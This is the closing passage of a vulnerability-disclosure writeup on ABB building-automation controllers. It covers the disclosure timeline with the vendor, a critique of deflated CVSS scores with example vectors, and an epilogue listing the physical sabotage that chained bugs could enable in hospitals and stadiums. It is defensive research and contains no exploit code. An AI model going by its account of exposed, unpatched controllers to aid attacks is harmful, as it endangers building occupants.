+  | 04 Jul 24  |  Vendor: "two bugs patched in 3.08.02."                |
+  | 18 Jul 24  |  I send the list of 800+ 0days.                        |
+  | 07 Aug 24  |  3.08.02 ships, "comprehensive security upgrades".     |
+  | 16 Aug 24  |  Vendor: advisory was "another anonymous researcher".  |
+  |            |  Also, no bug bounty for this product line.            |
+  | 06 Sep 24  |  I take the rest to CISA via CERT/CC VINCE.            |
+  | 16 Sep 24  |  Meeting and a "thank you". I mention the writeup.     |
+  | 26 Feb 25  |  A thank-you letter from an ABB EVP.                   |
+  | 10 Mar 25  |  I try to report NEW critical bugs. Vendor goes quiet. |
+  | 14 Apr 25  |  Vendor: "still waiting on the business division."     |
+  | 19 May 25  |  Silence continues. I start releasing.                 |
+  | 22 May 25  |  Advisory: 32 more CVEs, only 14 fixed. The rest are   |
+  |            |  marked "no plans for corrective measures". Nearly     |
+  |            |  all mis-scored with a blanket "if admin creds are     |
+  |            |  compromised" caveat that misrepresents the risk.      |
+  | 11 Aug 25  |  7 more CVEs. Pre-auth root RCE scored CVSS 7.3.       |
+  | 24 Nov 25  |  Game Over.                                            |
+  '------------'--------------------------------------------------------'
+
+Two threads run through all of it. The first is the scoring. ABB is a
+CNA, so it sets its own CVSS, and it kept setting it low. Take the
+pre-auth root RCE fixed in 3.08.04-s01. It is network reachable, needs no
+authentication, needs no user interaction, and hands you a root shell.
+The honest CVSS v3.1 vector is:
+
+    AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H   =  9.8
+
+ABB published 7.3. There are only two ways to land on 7.3 from that bug.
+Either you rate the impacts Low across the board:
+
+    AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L   =  7.3
+
+which says a root shell is a low hit to confidentiality, integrity and
+availability, or you assume privileges are required:
+
+    AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H   =  7.2
+
+which is exactly the "only exploitable if administrator credentials
+become compromised" wording ABB pasted across the 3.08.04 batch. That
+line is not a mitigation. It is PR:H smuggled into the prose, and it is
+false whenever the bug needs no credentials. Same move, roughly two and a
+half points shaved off, applied dozens of times. Drop the vectors into
+any CVSS calculator and check me.
+
+The second thread is the "these were never meant to be Internet-facing"
+defense. On paper the vendor is right. Their own document HT0038, "Aspect
+/ FBXi / CBXi System Network Security Best Practice", says to isolate the
+controllers, keep them off the public Internet, and reach them only
+through a VPN. In the field none of that happens. Provisioners and
+installers put these boxes straight onto public IPs because it is the
+quickest way to get a remote HMI working, and the product ships nothing
+that stops them.
+
+The defense also fights the firmware. If the device was never supposed to
+touch the Internet, someone needs to explain /etc/cron.daily/yum-update,
+a job that runs "yum -y update" every single day to pull OS packages from
+remote repositories, backed by the yumProxy.sh and yumSettings.php
+plumbing for proxied outbound access (the same yumSettings.php from
+section 5). A box that phones home for package updates on a daily cron
+was designed to be online. You cannot ship an Internet update client and
+then disown the Internet once the bugs land.
+
+It would be more comforting anyway if the vendor's own website had not
+been serving the firmware to the public, and if Shodan were not full of
+these boxes wired straight to the wall and the Internet, some running
+firmware fifteen years old.
+
+To be fair where fairness is due, after the shouting ABB did put in real
+work. They brought in an external security firm, resolved 95% of the
+FLXeon issues in 9.3.5, made hundreds of hardening changes in Aspect, and
+finally pulled the firmware from public download. Attention to detail
+matters. It just shouldn't take a stranger with a filesystem tarball and
+a year of his life to install it.
+
+
+--[ 17 - Shouts & epilogue
+
+If you build networked ICS gear, collaborate with the people reporting
+your bugs, score them honestly, and audit the whole file instead of the
+one line in the PoC. And stop treating "it wasn't meant to be on the
+Internet" as a control. It isn't one. The buildings are already online.
+
+This is an 18-year-old codebase and a 6-year-old one, neither ever given
+a real security review, running the physical guts of skyscrapers,
+hospitals and stadiums. Attackers who chain what's in this file can stop
+chillers and melt an ice rink, kill boilers and hot water, cut the lights
+in an operating room, silence smoke detectors, or open the PA and cause a
+panic. So, obligatory, don't. Patch, isolate, VPN, and get these things
+off the public Internet.
+
+Brainfog was first disclosed at Black Alps in Yverdon-les-Bains,
+Switzerland, in November 2025, and again at Black Hat Europe in London in
+December 2025. Since then, exactly one government has reached out: in
+October 2026 the FBI's cybercrime unit asked to meet and understand the
+continued exposure of U.S. facilities, from government and law-enforcement
+buildings and prisons to hospitals, schools, and water systems. I left
+with the impression that reaching the actual facility owners, operators,
+and vendors is still the hard part. The project is still active.
+
+Do not attempt to exploit these vulnerabilities. ;]
+
+Greetz to Thricer, Ange, Travis, Nicolas, Maor, Cooper, Flavio, Sandy,
+Melina, Wietze, Raphael, Marina, Bela, TMZ. And to everyone still holding
+a pager for a building that shouldn't be on the Internet, see you in the
+VulnCity.
+
+                                                        -- LiquidWorm
+                                                           Zero Science Lab
+
+|=-----------------------------------------------------------------------=|
+|=------------------------------=[ EOF ]=--------------------------------=|
+|=-----------------------------------------------------------------------=|
